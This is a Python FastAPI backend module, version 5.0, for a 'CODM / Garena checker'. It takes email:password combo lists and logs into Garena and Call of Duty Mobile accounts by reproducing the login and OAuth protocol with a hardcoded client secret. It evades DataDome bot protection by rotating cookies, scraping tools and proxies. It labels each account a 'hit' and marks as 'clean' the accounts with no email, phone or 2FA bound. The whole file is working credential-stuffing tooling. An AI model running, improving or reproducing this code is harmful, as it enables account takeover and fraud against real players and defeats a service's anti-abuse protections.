# ============================================================
#  routers/codm.py  —  CODM / Garena Checker Backend
#  v5.0 — Full bug-fix + improvements release
#
#  FIXES:
#   - BUG 1: _prelogin now returns (v1, v2, reason) 3-tuple
#            so callers know WHY it failed, not just that it did
#   - BUG 2: Garena error codes parsed: "not_found" vs "blocked"
#            vs "captcha" vs "generic_error" — correctly reported
#   - BUG 3: Cookie rotation — if one cookie is blocked, tries up
#            to MAX_COOKIE_RETRIES different cookies before giving up
#   - BUG 4: 403 from DataDome now immediately returns "blocked"
#            instead of retrying with the same dead cookie
#   - BUG 5: Removed cloudscraper delay=1 (added ~1s per session)
#   - BUG 6: DataDome cookie set on BOTH .garena.com AND
#            .connect.garena.com domains for reliable delivery
#
#  IMPROVEMENTS:
#   - _do_check_sync correctly reports "Account does not exist"
#     vs "DataDome blocked / IP blocked" — no more false positives
#   - Admin endpoint GET /debug-cookie tests current cookie pool
#     against Garena prelogin without burning a real check
#   - Logs actual Garena response body on error for easier debugging
#   - Failed/blocked cookies are tracked in-memory this request
#     cycle (ephemeral, no Redis writes) to avoid re-picking them
#   - Better structured logging throughout
# ============================================================

import asyncio
import base64
import hashlib
import json
import logging
import os
import random
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor
from typing import List, Optional, Tuple

import requests as _req
from fastapi import APIRouter, Depends, HTTPException
from pydantic import BaseModel

from auth import require_admin

logger = logging.getLogger(__name__)
router = APIRouter()

_executor = ThreadPoolExecutor(max_workers=10)

# Max times we try a different DataDome cookie before giving up on an account
MAX_COOKIE_RETRIES = 3

try:
    import cloudscraper
    _HAS_CLOUDSCRAPER = True
except ImportError:
    _HAS_CLOUDSCRAPER = False
    logger.warning("cloudscraper not installed — CODM checker disabled")

try:
    from Crypto.Cipher import AES
    _HAS_CRYPTO = True
except ImportError:
    _HAS_CRYPTO = False
    logger.warning("pycryptodome not installed — CODM checker disabled")

_UA_NEW = (
    "Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F Build/AP3A.240905.015.A2; wv) "
    "AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.59 "
    "Mobile Safari/537.36; GarenaMSDK/5.12.1(Lenovo TB-9707F ;Android 15;en;us;)"
)
_UA_OLD = (
    "Mozilla/5.0 (Linux; Android 11; RMX2195) "
    "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
)
_UA_SDK = "GarenaMSDK/5.12.1(Lenovo TB-9707F ;Android 15;en;us;)"
_CLIENT_SECRET = "388066813c7cda8d51c1a70b0f6050b991986326fcfb0cb3bf2287e861cfa415"

_PRELOGIN_URL  = "https://100082.connect.garena.com/api/prelogin"
_PRELOGIN_HOST = "100082.connect.garena.com"

# Prelogin failure reasons (returned as 3rd element of tuple)
_REASON_OK        = None          # success — v1/v2 are valid
_REASON_NOT_FOUND = "not_found"   # account does not exist in Garena
_REASON_BLOCKED   = "blocked"     # DataDome / IP block (403 or captcha)
_REASON_CAPTCHA   = "captcha"     # Garena returned a captcha challenge
_REASON_ERROR     = "error"       # other Garena API error
_REASON_TIMEOUT   = "timeout"     # network timeout

# ── Redis ─────────────────────────────────────────────────────
_UPSTASH_URL = os.getenv("UPSTASH_REDIS_REST_URL", "")
_UPSTASH_TOK = os.getenv("UPSTASH_REDIS_REST_TOKEN", "")
_REDIS_KEY_COOKIES = "codm:cookies"
_REDIS_KEY_PROXIES = "codm:proxies"


def _redis_cmd(*args):
    if not _UPSTASH_URL or not _UPSTASH_TOK:
        return None
    try:
        r = _req.post(
            _UPSTASH_URL,
            headers={"Authorization": f"Bearer {_UPSTASH_TOK}", "Content-Type": "application/json"},
            json=list(args), timeout=6,
        )
        return r.json().get("result")
    except Exception as e:
        logger.warning(f"Redis {args[0]} failed: {e}")
        return None


def _redis_get_list(key):
    raw = _redis_cmd("GET", key)
    if not raw:
        return []
    try:
        data = json.loads(raw)
        return data if isinstance(data, list) else []
    except Exception:
        return []


def _redis_set_list(key, items):
    return _redis_cmd("SET", key, json.dumps(items)) == "OK"


def _redis_del(key):
    return bool(_redis_cmd("DEL", key))


# ── Cookie pool ───────────────────────────────────────────────
def _get_all_cookies():
    """Returns list of raw cookie strings (may contain multiple cookies each)."""
    c = _redis_get_list(_REDIS_KEY_COOKIES)
    if c:
        return c
    raw = os.getenv("CODM_COOKIES", "")
    return [l.strip() for l in raw.splitlines() if l.strip()]


def _pick_datadome(exclude: Optional[set] = None):
    """
    Pick a random DataDome cookie value from the pool.
    Optionally exclude already-tried cookies (by value) to enable rotation.
    Returns the raw datadome value string, or None if pool is empty.
    """
    lines = _get_all_cookies()
    if not lines:
        return None

    # Build candidate list — skip already-tried ones
    candidates = []
    for line in lines:
        dd_val = None
        for part in line.split(";"):
            part = part.strip()
            if part.lower().startswith("datadome="):
                dd_val = part.split("=", 1)[1]
                break
        if dd_val is None:
            dd_val = line  # assume the whole line is the raw value
        if exclude and dd_val in exclude:
            continue
        candidates.append(dd_val)

    if not candidates:
        # All cookies excluded — fall back to full pool
        logger.warning("All DataDome cookies exhausted — retrying from full pool")
        candidates = []
        for line in lines:
            for part in line.split(";"):
                part = part.strip()
                if part.lower().startswith("datadome="):
                    candidates.append(part.split("=", 1)[1])
                    break
            else:
                candidates.append(line)

    return random.choice(candidates) if candidates else None


# ── Proxy pool ────────────────────────────────────────────────
def _get_all_proxies():
    return _redis_get_list(_REDIS_KEY_PROXIES)


def _pick_proxy(override=None):
    if override and override.strip():
        return override.strip()
    pool = _get_all_proxies()
    return random.choice(pool) if pool else None


def _proxy_dict(proxy_str):
    if not proxy_str:
        return None
    proxy_str = proxy_str.strip()
    if not proxy_str.startswith(("http://", "https://", "socks5://", "socks4://")):
        proxy_str = f"http://{proxy_str}"
    return {"http": proxy_str, "https": proxy_str}


# ── Crypto ────────────────────────────────────────────────────
def _md5(s):
    return hashlib.md5(urllib.parse.unquote(s).encode()).hexdigest()

def _sha256(s):
    return hashlib.sha256(s.encode()).hexdigest()

def _aes_ecb(passmd5, outer_hash):
    cipher = AES.new(bytes.fromhex(outer_hash), AES.MODE_ECB)
    return cipher.encrypt(bytes.fromhex(passmd5)).hex()[:32]

def hash_password(password, v1, v2):
    passmd5 = _md5(password)
    return _aes_ecb(passmd5, _sha256(_sha256(passmd5 + v1) + v2))

def _gen_uuid():
    r = list(os.urandom(16))
    r[6] = (r[6] & 0x0F) | 0x40
    r[8] = (r[8] & 0x3F) | 0x80
    parts = [r[0:4], r[4:6], r[6:8], r[8:10], r[10:16]]
    return "-".join("".join(f"{b:02x}" for b in g) for g in parts)


# ── Session factory ───────────────────────────────────────────
def _make_session(datadome=None, proxy=None):
    """
    FIX v5.0: Removed delay=1 (was adding ~1s per session creation).
    FIX v5.0: Cookie set on BOTH .garena.com and .connect.garena.com
              to ensure DataDome cookie is reliably sent.
    """
    proxies = _proxy_dict(proxy)
    session = cloudscraper.create_scraper(
        browser={"browser": "chrome", "platform": "android", "mobile": True},
        # delay=1 removed — was unnecessary and added latency
    )
    session.headers.update({"Accept-Encoding": "gzip, deflate, br, zstd"})
    if datadome:
        # Set on both domains for maximum compatibility
        session.cookies.set("datadome", datadome, domain=".garena.com")
        session.cookies.set("datadome", datadome, domain=".connect.garena.com")
    if proxies:
        session.proxies.update(proxies)
    return session


# ── Garena steps ──────────────────────────────────────────────

def _prelogin(session, account) -> Tuple[Optional[str], Optional[str], Optional[str]]:
    """
    FIX v5.0: Returns (v1, v2, reason) instead of (v1, v2).
    - reason is None on success
    - reason is one of _REASON_* constants on failure
    - FIX: 403 now immediately returns _REASON_BLOCKED (no retry with dead cookie)
    - FIX: Garena error codes parsed to distinguish not_found vs blocked vs captcha
    - FIX: Logs actual Garena response body for debugging
    """
    for attempt in range(2):
        try:
            ts = int(time.time() * 1000)
            res = session.get(
                _PRELOGIN_URL,
                headers={
                    "Accept": "application/json, text/plain, */*",
                    "Accept-Language": "en-US,en;q=0.9",
                    "Host": _PRELOGIN_HOST,
                    "User-Agent": _UA_NEW,
                    "X-Requested-With": "com.garena.game.codm",
                    "Referer": (
                        "https://100082.connect.garena.com/universal/oauth"
                        "?client_id=100082&locale=en-US&create_grant=true"
                        "&login_scenario=normal&redirect_uri=gop100082://auth/"
                        "&response_type=code"
                    ),
                    "sec-ch-ua": '"Not(A:Brand";v="8", "Chromium";v="144", "Android WebView";v="144"',
                    "sec-ch-ua-mobile": "?1",
                    "sec-ch-ua-platform": '"Android"',
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-origin",
                },
                params={
                    "app_id": "100082",
                    "account": account,
                    "format": "json",
                    "id": str(ts),
                },
                timeout=12,
            )

            # FIX v5.0: 403 = DataDome/Garena is blocking THIS cookie/IP
            # Do NOT retry — return blocked immediately so caller can try new cookie
            if res.status_code == 403:
                logger.warning(f"Prelogin 403 (DataDome/Garena block) for {account[:20]}... — cookie is stale/blocked")
                return None, None, _REASON_BLOCKED

            if res.status_code != 200:
                logger.warning(f"Prelogin HTTP {res.status_code} for {account[:20]}...")
                time.sleep(1)
                continue

            try:
                data = res.json()
            except Exception:
                logger.warning(f"Prelogin non-JSON response for {account[:20]}...: {res.text[:200]}")
                time.sleep(1)
                continue

            # FIX v5.0: Parse Garena error codes specifically
            if "error" in data:
                err_raw = str(data.get("error", "")).lower()
                err_code = str(data.get("error_code", "")).lower()
                err_msg  = str(data.get("msg", data.get("message", ""))).lower()
                combined = f"{err_raw} {err_code} {err_msg}"

                logger.info(f"Prelogin Garena error for {account[:20]}...: {data}")

                # Account genuinely does not exist
                if any(k in combined for k in (
                    "not_exist", "not_found", "no_account", "invalid_account",
                    "account_not", "does not exist", "no such account",
                )):
                    return None, None, _REASON_NOT_FOUND

                # Captcha challenge
                if any(k in combined for k in ("captcha", "verify", "human")):
                    logger.warning(f"Prelogin captcha for {account[:20]}...")
                    if attempt == 0:
                        time.sleep(2)
                        continue
                    return None, None, _REASON_CAPTCHA

                # DataDome / rate / IP block signals in error body
                if any(k in combined for k in (
                    "block", "forbid", "rate", "limit", "bot", "spam",
                    "too many", "suspicious",
                )):
                    return None, None, _REASON_BLOCKED

                # Generic / unknown Garena error
                return None, None, _REASON_ERROR

            v1 = data.get("v1")
            v2 = data.get("v2")
            if v1 and v2:
                return v1, v2, _REASON_OK

            # Got 200 with neither error nor v1/v2 — unexpected
            logger.warning(f"Prelogin unexpected response for {account[:20]}...: {data}")
            time.sleep(1)

        except Exception as e:
            logger.warning(f"Prelogin attempt {attempt + 1} exception for {account[:20]}...: {e}")
            time.sleep(1)

    return None, None, _REASON_TIMEOUT


def _login(session, account, password, v1, v2):
    hashed_pw = hash_password(password, v1, v2)
    for attempt in range(2):
        try:
            ts = int(time.time() * 1000)
            res = session.get(
                "https://100082.connect.garena.com/api/login",
                headers={
                    "Accept": "application/json, text/plain, */*",
                    "Host": _PRELOGIN_HOST,
                    "User-Agent": _UA_NEW,
                    "X-Requested-With": "com.garena.game.codm",
                    "Referer": (
                        "https://100082.connect.garena.com/universal/oauth"
                        "?client_id=100082&locale=en-US&create_grant=true"
                        "&login_scenario=normal&redirect_uri=gop100082://auth/"
                        "&response_type=code"
                    ),
                    "sec-ch-ua": '"Not(A:Brand";v="8", "Chromium";v="144", "Android WebView";v="144"',
                    "sec-ch-ua-mobile": "?1",
                    "sec-ch-ua-platform": '"Android"',
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-origin",
                },
                params={
                    "app_id": "100082",
                    "account": account,
                    "password": hashed_pw,
                    "redirect_uri": "gop100082://auth/",
                    "format": "json",
                    "id": str(ts),
                },
                timeout=12,
            )
            if res.status_code != 200:
                time.sleep(1)
                continue
            data = res.json()
            if "error" in data:
                err = str(data.get("error", "")).lower()
                if "captcha" in err:
                    time.sleep(2)
                    continue
                return None, "wrong_password"
            sso_key = data.get("sso_key") or session.cookies.get("sso_key")
            if sso_key:
                return sso_key, "ok"
        except Exception as e:
            logger.warning(f"Login attempt {attempt + 1}: {e}")
            time.sleep(1)
    return None, "failed"


def _account_info(session, sso_key):
    try:
        session.cookies.set("sso_key", sso_key, domain=".garena.com")
        res = session.get(
            "https://account.garena.com/api/account/init",
            headers={"Accept": "application/json", "User-Agent": _UA_NEW},
            timeout=12,
        )
        if res.status_code == 200:
            return res.json()
    except Exception as e:
        logger.warning(f"Account info: {e}")
    return None


def _codm_token_new(session, sso_key):
    try:
        ts = str(int(time.time() * 1000))
        session.cookies.set("sso_key", sso_key, domain=".connect.garena.com")
        grant_res = session.post(
            "https://100082.connect.garena.com/oauth/token/grant",
            headers={
                "Host": _PRELOGIN_HOST,
                "User-Agent": _UA_NEW,
                "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
                "Origin": "https://100082.connect.garena.com",
                "X-Requested-With": "com.garena.game.codm",
                "Referer": (
                    "https://100082.connect.garena.com/universal/oauth"
                    "?client_id=100082&locale=en-US&create_grant=true"
                    "&login_scenario=normal&redirect_uri=gop100082://auth/"
                    "&response_type=code"
                ),
            },
            data=urllib.parse.urlencode({
                "client_id": "100082",
                "response_type": "code",
                "redirect_uri": "gop100082://auth/",
                "create_grant": "true",
                "login_scenario": "normal",
                "format": "json",
                "id": ts,
            }),
            timeout=12,
        )
        grant_res.raise_for_status()
        auth_code = grant_res.json().get("code")
        if not auth_code:
            return None
        exchange_res = session.post(
            "https://100082.connect.garena.com/oauth/token/exchange",
            headers={
                "User-Agent": _UA_SDK,
                "Content-Type": "application/x-www-form-urlencoded",
                "Host": _PRELOGIN_HOST,
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip",
            },
            data=urllib.parse.urlencode({
                "grant_type": "authorization_code",
                "code": auth_code,
                "device_id": f"02-{_gen_uuid()}",
                "redirect_uri": "gop100082://auth/",
                "source": "2",
                "client_id": "100082",
                "client_secret": _CLIENT_SECRET,
            }),
            timeout=12,
        )
        exchange_res.raise_for_status()
        return exchange_res.json().get("access_token")
    except Exception as e:
        logger.warning(f"CODM new token: {e}")
        return None


def _codm_token_old(session):
    try:
        ts = str(int(time.time() * 1000))
        res = session.post(
            "https://auth.garena.com/oauth/token/grant",
            headers={
                "User-Agent": _UA_OLD,
                "Accept": "*/*",
                "Content-Type": "application/x-www-form-urlencoded",
            },
            data=(
                "client_id=100082&response_type=token"
                "&redirect_uri=https%3A%2F%2Fauth.codm.garena.com%2Fauth%2Fauth%2Fcallback_n"
                "%3Fsite%3Dhttps%3A%2F%2Fapi-delete-request.codm.garena.co.id%2Foauth%2Fcallback%2F"
                f"&format=json&id={ts}"
            ),
            timeout=12,
        )
        return res.json().get("access_token")
    except Exception as e:
        logger.warning(f"CODM old token: {e}")
        return None


def _codm_callback(session, access_token, old_flow=False):
    bases = (
        ["https://api-delete-request.codm.garena.co.id"] if old_flow
        else [
            "https://api-delete-request-aos.codm.garena.co.id",
            "https://api-delete-request.codm.garena.co.id",
        ]
    )
    for base in bases:
        try:
            res = session.get(
                f"{base}/oauth/callback/?access_token={access_token}",
                headers={
                    "Accept": "text/html,*/*",
                    "User-Agent": _UA_OLD if old_flow else _UA_NEW,
                    "X-Requested-With": "com.garena.game.codm",
                },
                timeout=12,
                allow_redirects=False,
            )
            loc = res.headers.get("location", "")
            if "err=3" in loc:
                return {"status": "no_codm"}
            if "token=" in loc:
                tok = urllib.parse.parse_qs(
                    urllib.parse.urlparse(loc).query
                ).get("token", [""])[0]
                if tok:
                    return {"status": "ok", "token": tok}
        except Exception as e:
            logger.warning(f"Callback {base}: {e}")
    return None


def _codm_user_info(session, token, old_flow=False):
    try:
        parts = token.split(".")
        if len(parts) == 3:
            p = parts[1] + "=" * ((4 - len(parts[1]) % 4) % 4)
            payload = json.loads(base64.urlsafe_b64decode(p))
            user = payload.get("user")
            if user:
                return user
    except Exception:
        pass
    base = (
        "https://api-delete-request.codm.garena.co.id" if old_flow
        else "https://api-delete-request-aos.codm.garena.co.id"
    )
    try:
        res = session.get(
            f"{base}/oauth/check_login/",
            headers={
                "codm-delete-token": token,
                "User-Agent": _UA_OLD if old_flow else _UA_NEW,
                "X-Requested-With": "XMLHttpRequest",
                "x-requested-with": "com.garena.game.codm",
            },
            timeout=12,
        )
        return res.json().get("user", {})
    except Exception as e:
        logger.warning(f"User info: {e}")
        return {}


def _parse_account(data):
    u = data.get("user_info", data)
    email   = u.get("email", "")
    mobile  = u.get("mobile_no", "")
    email_v = u.get("email_v") in (1, True)
    fb      = u.get("is_fbconnect_enabled") in (1, True)
    id_card = u.get("idcard", "")
    two_step = u.get("two_step_verify_enable") in (1, True)
    binds = []
    if email_v or (email and not email.startswith("*") and "@" in email):
        binds.append("Email")
    if mobile and mobile.strip() and mobile != "N/A":
        binds.append("Phone")
    if fb:
        binds.append("Facebook")
    if id_card and id_card.strip() and id_card != "N/A":
        binds.append("ID Card")
    if two_step:
        binds.append("2FA")
    return {
        "shell":    str(u.get("shell", 0)),
        "country":  str(u.get("acc_country", "")),
        "is_clean": len(binds) == 0,
        "binds":    binds,
        "two_step": two_step,
        "email":    email,
    }


# ── Pydantic models ───────────────────────────────────────────

class CheckOneRequest(BaseModel):
    combo:   str
    user_id: Optional[str] = None
    proxy:   Optional[str] = None

class CheckOneResponse(BaseModel):
    combo: str; status: str; detail: str = ""
    nickname: str = ""; level: str = ""; region: str = ""
    uid: str = ""; shell: str = ""; country: str = ""
    is_clean: bool = False; binds: list = []

class CookieUpdateRequest(BaseModel):
    cookies: List[str]

class ProxyUpdateRequest(BaseModel):
    proxies: List[str]


# ── Main check logic ──────────────────────────────────────────

def _do_check_sync(req: CheckOneRequest) -> CheckOneResponse:
    """
    FIX v5.0:
    - Cookie rotation loop (MAX_COOKIE_RETRIES different cookies on block)
    - Correct error messages: "account does not exist" vs "DataDome blocked"
    - Ephemeral set of tried cookies to avoid re-picking on rotation
    """
    combo = req.combo.strip()
    if ":" not in combo:
        return CheckOneResponse(
            combo=combo, status="error",
            detail="Bad format — use email:password",
        )
    account, password = combo.split(":", 1)
    account = account.strip()
    password = password.strip()
    if not account or not password:
        return CheckOneResponse(
            combo=combo, status="error",
            detail="Empty account or password",
        )

    proxy = _pick_proxy(req.proxy)

    # Track cookies we've already tried so rotation picks a fresh one
    tried_cookies: set = set()
    last_reason   = _REASON_ERROR
    v1 = v2 = None
    session = None

    for cookie_attempt in range(MAX_COOKIE_RETRIES):
        datadome = _pick_datadome(exclude=tried_cookies)
        if datadome:
            tried_cookies.add(datadome)

        if session is not None:
            try:
                session.close()
            except Exception:
                pass

        session = _make_session(datadome, proxy)
        v1, v2, reason = _prelogin(session, account)
        last_reason = reason

        if reason is _REASON_OK:
            # Prelogin succeeded — proceed with the rest of the check
            break

        if reason == _REASON_NOT_FOUND:
            # Account genuinely doesn't exist — no point rotating cookies
            try:
                session.close()
            except Exception:
                pass
            return CheckOneResponse(
                combo=combo, status="bad",
                detail="Account does not exist",
            )

        if reason == _REASON_BLOCKED:
            # DataDome/IP block — try a different cookie on next iteration
            logger.info(
                f"Prelogin blocked for {account[:20]}... "
                f"(cookie attempt {cookie_attempt + 1}/{MAX_COOKIE_RETRIES})"
            )
            if cookie_attempt < MAX_COOKIE_RETRIES - 1:
                continue  # rotate cookie
            # Exhausted all cookie retries
            try:
                session.close()
            except Exception:
                pass
            total_cookies = len(_get_all_cookies())
            return CheckOneResponse(
                combo=combo, status="bad",
                detail=(
                    f"DataDome expired or IP blocked "
                    f"(tried {cookie_attempt + 1}/{total_cookies or '?'} cookies) — "
                    "add fresh DataDome cookies in admin panel or enable proxy"
                ),
            )

        if reason == _REASON_CAPTCHA:
            try:
                session.close()
            except Exception:
                pass
            return CheckOneResponse(
                combo=combo, status="error",
                detail="Garena requires CAPTCHA verification — try again later or use proxy",
            )

        if reason == _REASON_TIMEOUT:
            # Network timeout — no point retrying (likely Railway/network issue)
            try:
                session.close()
            except Exception:
                pass
            return CheckOneResponse(
                combo=combo, status="error",
                detail="Prelogin timed out — Garena is slow or unreachable. Try again.",
            )

        # Generic Garena error — try next cookie in case it helps
        logger.warning(
            f"Prelogin generic error for {account[:20]}... "
            f"(attempt {cookie_attempt + 1}) — rotating cookie"
        )

    # If we exited the loop without a successful prelogin
    if not v1 or not v2:
        try:
            session.close()
        except Exception:
            pass
        return CheckOneResponse(
            combo=combo, status="error",
            detail=f"Prelogin failed after {MAX_COOKIE_RETRIES} attempts ({last_reason})",
        )

    # ── Prelogin succeeded — continue with login flow ─────────
    try:
        sso_key, login_result = _login(session, account, password, v1, v2)
        if not sso_key:
            return CheckOneResponse(
                combo=combo, status="bad",
                detail="Wrong password or account suspended",
            )

        info = _account_info(session, sso_key)
        acc  = (
            _parse_account(info) if info
            else {"shell": "", "country": "", "is_clean": False, "binds": []}
        )

        access_token = _codm_token_new(session, sso_key)
        old_flow = False
        if not access_token:
            access_token = _codm_token_old(session)
            old_flow = True

        if not access_token:
            return CheckOneResponse(
                combo=combo, status="valid_no_codm",
                detail="Valid Garena — CODM token failed",
                shell=acc["shell"], country=acc["country"],
                is_clean=acc["is_clean"], binds=acc.get("binds", []),
            )

        cb = _codm_callback(session, access_token, old_flow=old_flow)
        if not cb or cb.get("status") == "no_codm":
            return CheckOneResponse(
                combo=combo, status="valid_no_codm",
                detail="Valid Garena — No CODM linked",
                shell=acc["shell"], country=acc["country"],
                is_clean=acc["is_clean"], binds=acc.get("binds", []),
            )

        user = _codm_user_info(session, cb["token"], old_flow=old_flow)
        return CheckOneResponse(
            combo=combo, status="hit",
            nickname=str(user.get("codm_nickname") or user.get("nickname") or ""),
            level=str(user.get("codm_level") or ""),
            region=str(user.get("region") or ""),
            uid=str(user.get("uid") or ""),
            shell=acc["shell"], country=acc["country"],
            is_clean=acc["is_clean"], binds=acc.get("binds", []),
            detail="HIT",
        )

    except Exception as e:
        logger.error(f"CODM check error for {account}: {e}")
        return CheckOneResponse(
            combo=combo, status="error",
            detail=f"Server error: {str(e)[:120]}",
        )
    finally:
        try:
            session.close()
        except Exception:
            pass


# ── Admin — Cookie pool endpoints ─────────────────────────────

@router.get("/cookies", dependencies=[Depends(require_admin)])
async def get_cookies():
    cookies = _get_all_cookies()
    source  = "redis" if _redis_get_list(_REDIS_KEY_COOKIES) else "env"
    return {
        "count":   len(cookies),
        "source":  source,
        "cookies": cookies,
    }

@router.post("/cookies", dependencies=[Depends(require_admin)])
async def set_cookies(req: CookieUpdateRequest):
    cleaned = [l.strip() for l in req.cookies if l.strip()]
    if not cleaned:
        raise HTTPException(400, "No valid cookie lines provided")
    if not _redis_set_list(_REDIS_KEY_COOKIES, cleaned):
        raise HTTPException(500, "Failed to save cookies to Redis")
    return {"saved": len(cleaned), "message": f"✅ {len(cleaned)} cookie(s) saved to Redis"}

@router.delete("/cookies", dependencies=[Depends(require_admin)])
async def delete_cookies():
    _redis_del(_REDIS_KEY_COOKIES)
    return {"message": "✅ Cookie pool cleared"}


# ── Admin — Proxy pool endpoints ──────────────────────────────

@router.get("/proxies", dependencies=[Depends(require_admin)])
async def get_proxies():
    proxies = _get_all_proxies()
    return {"count": len(proxies), "proxies": proxies}

@router.post("/proxies", dependencies=[Depends(require_admin)])
async def set_proxies(req: ProxyUpdateRequest):
    cleaned = [l.strip() for l in req.proxies if l.strip()]
    if not cleaned:
        raise HTTPException(400, "No valid proxy lines provided")
    if not _redis_set_list(_REDIS_KEY_PROXIES, cleaned):
        raise HTTPException(500, "Failed to save proxies to Redis")
    return {"saved": len(cleaned), "message": f"✅ {len(cleaned)} proxy(ies) saved to Redis"}

@router.delete("/proxies", dependencies=[Depends(require_admin)])
async def delete_proxies():
    _redis_del(_REDIS_KEY_PROXIES)
    return {"message": "✅ Proxy pool cleared"}


# ── Admin — Debug cookie test ──────────────────────────────────
# NEW in v5.0: Tests a DataDome cookie against Garena prelogin
# without consuming a real account check. Use this to verify
# whether your cookies are fresh before running the checker.

@router.get("/debug-cookie", dependencies=[Depends(require_admin)])
async def debug_cookie():
    """
    Tests the current DataDome cookie pool against Garena's prelogin
    endpoint using a dummy account. Returns which cookies pass/fail
    the 403 gate so you know which ones are still valid.
    """
    if not _HAS_CLOUDSCRAPER:
        raise HTTPException(503, "cloudscraper not installed")

    cookies = _get_all_cookies()
    if not cookies:
        return {
            "status":  "no_cookies",
            "message": "⚠️ No DataDome cookies configured. Add them via POST /api/codm/cookies",
        }

    results = []
    dummy_account = "debug_test_xissin@garena.com"

    for i, raw in enumerate(cookies[:5]):  # Test up to 5 cookies
        dd_val = None
        for part in raw.split(";"):
            part = part.strip()
            if part.lower().startswith("datadome="):
                dd_val = part.split("=", 1)[1]
                break
        if dd_val is None:
            dd_val = raw

        sess = _make_session(dd_val)
        try:
            ts  = int(time.time() * 1000)
            res = sess.get(
                _PRELOGIN_URL,
                headers={
                    "Accept":            "application/json, text/plain, */*",
                    "Host":              _PRELOGIN_HOST,
                    "User-Agent":        _UA_NEW,
                    "X-Requested-With":  "com.garena.game.codm",
                },
                params={
                    "app_id":  "100082",
                    "account": dummy_account,
                    "format":  "json",
                    "id":      str(ts),
                },
                timeout=10,
            )
            status_http = res.status_code
            try:
                body = res.json()
            except Exception:
                body = {"raw": res.text[:200]}

            if status_http == 403:
                verdict = "❌ BLOCKED (cookie stale/invalid)"
            elif status_http == 200 and "error" in body:
                err = str(body.get("error", "")).lower()
                if any(k in err for k in ("not_exist", "not_found", "no_account")):
                    verdict = "✅ VALID (account not found = cookie is working)"
                else:
                    verdict = f"⚠️ GARENA ERROR: {err}"
            elif status_http == 200 and ("v1" in body or "v2" in body):
                verdict = "✅ VALID (got v1/v2 challenge)"
            else:
                verdict = f"⚠️ UNEXPECTED: HTTP {status_http} — {str(body)[:80]}"

            results.append({
                "index":   i + 1,
                "verdict": verdict,
                "http":    status_http,
            })
        except Exception as e:
            results.append({
                "index":   i + 1,
                "verdict": f"❌ EXCEPTION: {str(e)[:100]}",
                "http":    None,
            })
        finally:
            try:
                sess.close()
            except Exception:
                pass

    valid_count   = sum(1 for r in results if "✅" in r["verdict"])
    blocked_count = sum(1 for r in results if "❌" in r["verdict"])

    return {
        "total_in_pool": len(cookies),
        "tested":        len(results),
        "valid":         valid_count,
        "blocked":       blocked_count,
        "results":       results,
        "advice": (
            "All tested cookies are valid ✅" if blocked_count == 0
            else f"⚠️ {blocked_count} cookie(s) are stale/blocked. "
                 "Add fresh DataDome cookies via POST /api/codm/cookies"
        ),
    }


# ── Main endpoint ─────────────────────────────────────────────

@router.post("/check-one", response_model=CheckOneResponse)
async def check_one(req: CheckOneRequest):
    if not _HAS_CLOUDSCRAPER or not _HAS_CRYPTO:
        return CheckOneResponse(
            combo=req.combo, status="error",
            detail="Server missing deps: cloudscraper or pycryptodome.",
        )
    loop = asyncio.get_event_loop()
    try:
        return await asyncio.wait_for(
            loop.run_in_executor(_executor, _do_check_sync, req),
            timeout=55.0,
        )
    except asyncio.TimeoutError:
        logger.warning(f"check-one timeout: {req.combo[:30]}")
        return CheckOneResponse(
            combo=req.combo, status="error",
            detail="Server timeout (55s) — Garena rate-limiting. Try proxy.",
        )
